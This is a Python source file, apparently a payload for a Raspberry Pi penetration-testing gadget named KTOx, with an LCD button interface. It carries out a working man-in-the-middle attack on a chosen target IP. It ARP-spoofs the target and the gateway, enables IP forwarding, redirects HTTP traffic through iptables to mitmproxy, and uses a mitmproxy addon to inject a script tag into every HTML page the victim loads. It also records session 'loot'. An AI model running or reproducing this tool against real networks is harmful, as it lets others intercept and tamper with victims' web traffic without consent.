#!/usr/bin/env python3
"""
KTOx *payload* – **MITM Code Injector**
==========================================
This payload performs a Man-in-the-Middle (MITM) attack to inject custom
JavaScript code into HTTP responses. It uses `arpspoof` to redirect traffic
and `mitmproxy` with a custom script to modify web content on the fly.

Features:
- Interactive UI for selecting the network interface and target IP.
- Uses `arpspoof` to perform ARP poisoning between the target and gateway.
- Uses `mitmproxy` with a Python addon to inject JavaScript into HTML responses.
- Displays attack status and injection count on the LCD.
- Graceful exit via KEY3 or Ctrl-C, cleaning up all attack processes,
  restoring ARP tables, and resetting iptables/IP forwarding.

Controls:
- MAIN SCREEN:
    - OK: Start MITM attack.
    - KEY1: Edit network interface.
    - KEY2: Edit target IP.
    - KEY3: Exit Payload.
- INTERFACE INPUT SCREEN:
    - UP/DOWN: Change character at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm interface.
    - KEY3: Cancel input.
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm IP.
    - KEY3: Cancel input.
- ATTACKING SCREEN:
    - KEY3: Stop attack and exit.
"""
import sys
import os
import time
import signal
import subprocess
import threading

KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(__file__, '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)
_wifi_dir = os.path.join(KTOX_ROOT, 'wifi')
if os.path.isdir(_wifi_dir) and _wifi_dir not in sys.path:
    sys.path.insert(0, _wifi_dir)

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from scapy.all import Ether, ARP, srp # Needed for get_mac()

PINS: dict[str, int] = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

ETH_INTERFACE = "eth0"
TARGET_IP = ""
MITMPROXY_PORT = 8888  # 8080 is reserved for the KTOX WebUI
running = True
attack_processes = {}
status_message = "Starting..."
injection_count = 0
current_interface_input = ETH_INTERFACE
interface_input_cursor_pos = 0
current_ip_input = TARGET_IP
ip_input_cursor_pos = 0

LOOT_DIR = os.path.join(KTOX_ROOT, 'loot', 'mitm_code_injector')
os.makedirs(LOOT_DIR, exist_ok=True)

INJECTOR_SCRIPT_CONTENT = """
import re
from mitmproxy import http

JS_PAYLOAD = '<script>alert(\"KTOx was here!\");</script>'

class Injector:
    def response(self, flow: http.HTTPFlow) -> None:
        if flow.response and flow.response.status_code == 200 and "text/html" in flow.response.headers.get("Content-Type", ""):
            html = flow.response.get_text()
            html = re.sub(r"</head>", JS_PAYLOAD + "</head>", html, flags=re.IGNORECASE)
            flow.response.set_text(html)
            with open("/tmp/ktox_injector.log", "a") as f:
                f.write("injected\n")

addons = [Injector()]
"""
INJECTOR_SCRIPT_PATH = "/tmp/ktox_injector.py"

def save_loot_snapshot():
    try:
        ts = time.strftime('%Y-%m-%d_%H%M%S')
        inj = 0
        try:
            if os.path.exists("/tmp/ktox_injector.log"):
                with open("/tmp/ktox_injector.log", "r") as f:
                    inj = len(f.readlines())
        except Exception:
            inj = injection_count
        loot_file = os.path.join(LOOT_DIR, f"mitm_injector_{ts}.txt")
        with open(loot_file, 'w') as f:
            f.write("MITM Code Injector Session\n")
            f.write(f"Interface: {ETH_INTERFACE}\n")
            f.write(f"Target IP: {TARGET_IP or 'N/A'}\n")
            f.write(f"Mitmproxy port: {MITMPROXY_PORT}\n")
            f.write(f"Injection count: {inj}\n")
            f.write(f"Status: {status_message}\n")
            f.write(f"Timestamp: {ts}\n")
        print(f"Loot saved to {loot_file}")
    except Exception as e:
        print(f"Loot save failed: {e}", file=sys.stderr)

def cleanup(*_):
    global running
    if running:
        running = False
        
        for proc in attack_processes.values():
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except (ProcessLookupError, AttributeError):
                pass
        attack_processes.clear()
        
        subprocess.run("iptables -F", shell=True)
        subprocess.run("iptables -t nat -F", shell=True)
        subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        
        if os.path.exists(INJECTOR_SCRIPT_PATH):
            os.remove(INJECTOR_SCRIPT_PATH)
        if os.path.exists("/tmp/ktox_injector.log"):
            os.remove("/tmp/ktox_injector.log")
        save_loot_snapshot()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def show_message(lines, color="lime"):
    img = Image.new("RGB", (128, 128), (10, 0, 0))
    d = ImageDraw.Draw(img)
    font = FONT_TITLE
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main"):
    img = Image.new("RGB", (128, 128), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.text((5, 5), "MITM Code Injector", font=FONT_TITLE, fill=(231, 76, 60))
    d.line([(0, 22), (128, 22)], fill=(231, 76, 60), width=1)

    if screen_state == "main":
        d.text((5, 25), f"Interface: {ETH_INTERFACE}", font=FONT, fill=(242, 243, 244))
        d.text((5, 40), f"Target IP: {TARGET_IP}", font=FONT, fill=(242, 243, 244))
        d.text((5, 55), f"Status: {status_message}", font=FONT, fill=(212, 172, 13))
        d.text((5, 70), f"Injections: {injection_count}", font=FONT_TITLE, fill=(231, 76, 60))
        d.text((5, 115), "OK=Start | KEY1=Edit Iface | KEY2=Edit IP | KEY3=Exit", font=FONT, fill=(171, 178, 185))
    elif screen_state == "iface_input":
        d.text((5, 30), "Enter Interface:", font=FONT, fill=(242, 243, 244))
        display_iface = list(current_interface_input)
        if interface_input_cursor_pos < len(display_iface):
            display_iface[interface_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_iface[:16]), font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill=(171, 178, 185))
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Target IP:", font=FONT, fill=(242, 243, 244))
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill=(171, 178, 185))
    elif screen_state == "attacking":
        d.text((5, 25), f"Interface: {ETH_INTERFACE}", font=FONT, fill=(242, 243, 244))
        d.text((5, 40), f"Target IP: {TARGET_IP}", font=FONT, fill=(242, 243, 244))
        d.text((5, 55), f"Status: {status_message}", font=FONT, fill=(212, 172, 13))
        d.text((5, 70), f"Injections: {injection_count}", font=FONT_TITLE, fill=(231, 76, 60))
        d.text((5, 115), "KEY3=Stop", font=FONT, fill=(171, 178, 185))
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_text_input_logic(initial_text, screen_state_name, char_set):
    global current_interface_input, interface_input_cursor_pos, current_ip_input, ip_input_cursor_pos
    
    if screen_state_name == "iface_input":
        current_interface_input = initial_text
        interface_input_cursor_pos = len(initial_text) - 1
    else:
        current_ip_input = initial_text
        ip_input_cursor_pos = len(initial_text) - 1

    draw_ui(screen_state_name)
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            if screen_state_name == "iface_input":
                return current_interface_input
            else:
                return current_ip_input
        
        if btn == "LEFT":
            if screen_state_name == "iface_input":
                interface_input_cursor_pos = max(0, interface_input_cursor_pos - 1)
            else:
                ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui(screen_state_name)
        elif btn == "RIGHT":
            if screen_state_name == "iface_input":
                interface_input_cursor_pos = min(len(current_interface_input), interface_input_cursor_pos + 1)
            else:
                ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui(screen_state_name)
        elif btn in ("UP", "DOWN"):
            if screen_state_name == "iface_input":
                if interface_input_cursor_pos < len(current_interface_input):
                    char_list = list(current_interface_input)
                    current_char = char_list[interface_input_cursor_pos]
                    try:
                        char_index = char_set.index(current_char)
                        char_index = (char_index + 1) % len(char_set) if btn == "UP" else (char_index - 1 + len(char_set)) % len(char_set)
                        char_list[interface_input_cursor_pos] = char_set[char_index]
                    except ValueError:
                        char_list[interface_input_cursor_pos] = char_set[0]
                    current_interface_input = "".join(char_list)
                    draw_ui(screen_state_name)
            else:
                if ip_input_cursor_pos < len(current_ip_input):
                    char_list = list(current_ip_input)
                    current_char = char_list[ip_input_cursor_pos]
                    try:
                        char_index = char_set.index(current_char)
                        char_index = (char_index + 1) % len(char_set) if btn == "UP" else (char_index - 1 + len(char_set)) % len(char_set)
                        char_list[ip_input_cursor_pos] = char_set[char_index]
                    except ValueError:
                        char_list[ip_input_cursor_pos] = char_set[0]
                    current_ip_input = "".join(char_list)
                    draw_ui(screen_state_name)
        
        time.sleep(0.1)
    return None

def get_mac(ip, interface):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0, iface=interface)
        if ans:
            return ans[0][1].hwsrc
    except Exception as e:
        print(f"Error getting MAC for {ip} on {interface}: {e}", file=sys.stderr)
    return None

def run_attack():
    global status_message, attack_processes, injection_count, ETH_INTERFACE, TARGET_IP
    
    injection_count = 0
    
    if subprocess.run("which mitmdump", shell=True, capture_output=True).returncode != 0:
        status_message = "mitmdump not found!"
        return False
    if subprocess.run("which arpspoof", shell=True, capture_output=True).returncode != 0:
        status_message = "arpspoof not found!"
        return False

    status_message = "Finding gateway..."
    try:
        gateway_ip = subprocess.check_output(f"ip route | awk '/default/ {{print $3}}'", shell=True).decode().strip()
    except subprocess.CalledProcessError:
        status_message = "Gateway not found!"
        return False
    
    if not gateway_ip:
        status_message = "Gateway not found!"
        return False

    status_message = "Resolving MACs..."
    target_mac = get_mac(TARGET_IP, ETH_INTERFACE)
    gateway_mac = get_mac(gateway_ip, ETH_INTERFACE)
    
    if not target_mac:
        status_message = f"Target MAC for {TARGET_IP} not found!"
        return False
    if not gateway_mac:
        status_message = f"Gateway MAC for {gateway_ip} not found!"
        return False

    with open(INJECTOR_SCRIPT_PATH, "w") as f:
        f.write(INJECTOR_SCRIPT_CONTENT)
    if os.path.exists("/tmp/ktox_injector.log"):
        os.remove("/tmp/ktox_injector.log")

    status_message = "Enabling forwarding..."
    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=True)
    
    status_message = "Configuring iptables..."
    subprocess.run(f"iptables -t nat -A PREROUTING -i {ETH_INTERFACE} -p tcp --dport 80 -j REDIRECT --to-port {MITMPROXY_PORT}", shell=True, check=True)
    
    status_message = f"ARP spoofing {TARGET_IP}"
    cmd_arp_victim = f"arpspoof -i {ETH_INTERFACE} -t {TARGET_IP} {gateway_ip}"
    cmd_arp_gateway = f"arpspoof -i {ETH_INTERFACE} -t {gateway_ip} {TARGET_IP}"
    attack_processes['arp_victim'] = subprocess.Popen(cmd_arp_victim, shell=True, preexec_fn=os.setsid)
    attack_processes['arp_gateway'] = subprocess.Popen(cmd_arp_gateway, shell=True, preexec_fn=os.setsid)
    
    status_message = "Starting mitmdump..."
    cmd_mitm = f"mitmdump -T --listen-port {MITMPROXY_PORT} -s {INJECTOR_SCRIPT_PATH}"
    attack_processes['mitm'] = subprocess.Popen(cmd_mitm, shell=True, preexec_fn=os.setsid)
    
    status_message = "Injecting..."
    return True

if __name__ == "__main__":
    current_screen = "main"
    attack_thread = None
    try:
        import requests
        requests.packages.urllib3.disable_warnings()

        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    if run_attack():
                        current_screen = "attacking"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_interface_input = ETH_INTERFACE
                    current_screen = "iface_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_ip_input = TARGET_IP
                    current_screen = "ip_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "iface_input":
                char_set = "abcdefghijklmnopqrstuvwxyz0123456789"
                new_iface = handle_text_input_logic(current_interface_input, "iface_input", char_set)
                if new_iface:
                    ETH_INTERFACE = new_iface
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "ip_input":
                char_set = "0123456789."
                new_ip = handle_text_input_logic(current_ip_input, "ip_input", char_set)
                if new_ip:
                    TARGET_IP = new_ip
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "attacking":
                if os.path.exists("/tmp/ktox_injector.log"):
                    with open("/tmp/ktox_injector.log", "r") as f:
                        injection_count = len(f.readlines())
                draw_ui("attacking")
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                time.sleep(0.1)

            time.sleep(0.1)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        show_message(["CRITICAL ERROR:", str(e)[:20]], "red")
        time.sleep(3)
    finally:
        cleanup()
        if attack_thread and attack_thread.is_alive():
            attack_thread.join(timeout=1)
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("MITM Code Injector payload finished.")